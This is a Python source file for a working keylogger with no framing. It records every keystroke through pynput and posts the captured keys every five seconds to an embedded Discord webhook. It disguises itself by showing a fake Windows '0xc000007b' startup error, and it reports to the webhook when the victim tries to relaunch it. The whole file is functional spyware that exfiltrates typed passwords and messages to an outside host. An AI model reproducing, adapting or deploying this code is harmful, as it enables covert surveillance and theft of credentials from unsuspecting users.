import requests
import time
import threading
from pynput.keyboard import Listener
import ctypes
import psutil

# Replace with your actual webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1400086927042150592/AmtcB8x12io_0D9HJPPxVOleVvQTLgYEwLNdlE-pPelOTSfbQqECfrl6lt2UFA14S085"

pressed_keys = []
lock = threading.Lock()
def on_pressed(key):
    try:
        pressed_keys.append(key.char)
    except AttributeError:
        keyStr = str(key)
        keyStr = keyStr.replace("Key.", "")
        pressed_keys.append(keyStr)  # For special keys like space, enter, etc.

def kill_existing_main_exe():
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'].lower() == 'main.exe':
                print(f"Killing process: PID {proc.pid} - {proc.info['name']}")
                send_webhook("User tried to open this again!!")
                proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue       


def send_webhook(msg):
    data = {
        "content": str(msg)
    }

    try:
        requests.post(WEBHOOK_URL, json=data)
    except Exception as e:
        pass

#kill_existing_main_exe()

def errorMsg():
    ctypes.windll.user32.MessageBoxW(0, "The application was unable to start correctly (0xc000007b).\nClick OK to close the application", "Uncaught Error!", 0x20)

listen = Listener(on_press=on_pressed)
listen.start()

errorThread = threading.Thread(target=errorMsg)
errorThread.start()

send_webhook("Connected!")
while True:
    time.sleep(5)
    with lock:
        if pressed_keys:
            send_webhook(str(pressed_keys))
            pressed_keys.clear()
        else:
            send_webhook("No keys pressed :(")
